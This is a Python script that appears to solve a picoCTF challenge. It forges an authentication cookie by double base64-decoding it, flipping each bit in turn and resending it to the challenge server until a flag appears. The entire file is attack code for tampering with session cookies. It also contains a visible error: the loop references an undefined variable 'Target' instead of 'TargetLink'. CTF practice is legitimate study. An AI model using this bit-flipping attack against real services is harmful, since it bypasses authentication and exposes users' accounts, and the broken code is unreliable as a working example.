
import requests
from base64 import *

TargetLink = "http://mercury.picoctf.net:25992/"

session = requests.Session()

session.get(TargetLink)

Cookie = session.cookies["auth_name"]

RawCookie = b64decode(b64decode(Cookie))

for byte_index in range(len(RawCookie)):

    for bit_index in range(0, 8):
        Potential_RawCookie = RawCookie[0:byte_index] + (RawCookie[byte_index] ^ (1 << bit_index)).to_bytes(1,
        'big') + RawCookie[byte_index + 1:]

        Potential_Cookie = b64encode(b64encode(Potential_RawCookie)).decode()
        r = requests.get(Target, cookies={"auth_name": Potential_Cookie})

        if 'picoCTF{' in r.text:
            print("\n[*] FLAG ENCONTRADA: " + r.text.split("<code>")[1].split("</code>")[0])
            exit()
